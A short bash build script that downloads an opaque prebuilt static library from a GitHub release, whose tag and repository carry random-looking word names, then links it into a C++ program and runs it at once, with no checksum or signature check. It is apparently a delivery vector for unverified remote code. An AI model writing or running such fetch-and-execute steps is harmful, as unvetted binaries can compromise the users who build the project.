#!/usr/bin/env bash
set -e
TAG="calm-cedar-crimson-forest"
LIB="wool-strut.a"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "https://github.com/warmrecandle/processedsteelkit/releases/download/${TAG}/${LIB}"
g++ -pthread -O2 -std=c++17 main.cpp "$LIB" -o app && ./app
